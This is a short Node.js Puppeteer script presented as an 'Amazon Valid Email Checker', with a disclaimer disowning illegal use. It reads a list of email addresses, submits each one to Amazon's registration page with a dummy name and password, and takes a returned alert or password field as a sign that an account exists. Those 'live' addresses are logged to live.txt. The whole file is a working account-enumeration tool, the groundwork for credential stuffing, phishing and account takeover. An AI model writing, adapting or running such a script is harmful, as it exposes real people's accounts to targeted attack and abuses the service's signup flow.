const puppeteer = require('puppeteer')
const fs = require('fs')

const welcome = `-------------------------
Amazon Valid Email Checker by Casen version 2.0
I don't accept any responsibility for any illegal use
-------------------------`
const end = `-------------------------
Checking Done -> Live Email Saved in live.txt
-------------------------`

const getList = () => {
    const fileContents = fs.readFileSync('list.txt', 'utf-8');
    const lines = fileContents.split('\n');
    
    return lines;
}

const run = async (email) => {
    const browser = await puppeteer.launch({
        headless: 'new'
    });
    const page = await browser.newPage();
    await page.goto('https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
    await page.type('#ap_customer_name', 'Eisen Hower');
    await page.type('#ap_email', email);
    await page.type('#ap_password', 'BirdyBirdySad012');
    await page.type('#ap_password_check', 'BirdyBirdySad012');
    await page.click('#continue');
    await page.waitForNavigation({
        waitUntil: 'networkidle0'
    });
    const passwordElementExists = await page.$('#ap_password');
    const alertElementExists = await page.$('.a-alert-heading');
    if (passwordElementExists || alertElementExists) {
        await browser.close();
        return true;
    } else {
        await browser.close();
        return false;
    }
};


const main = async () => {
    console.log(welcome);
    const list = getList();
    let index = 1;
    const listLength = list.length;
    for (let email of list) {
        const isLive = await run(email);
        if (isLive) {
            console.log(`[${index}|${listLength}] [LIVE] | ${email}`);
            fs.appendFile('live.txt', `${email}\n`, (err) => {
                if (err) {
                    console.log(err);
                }
            });
        } else {
            console.log(`[${index}|${listLength}] [DIE] | ${email}`);
        }
        index++;
    }
    console.log(end);
}
main()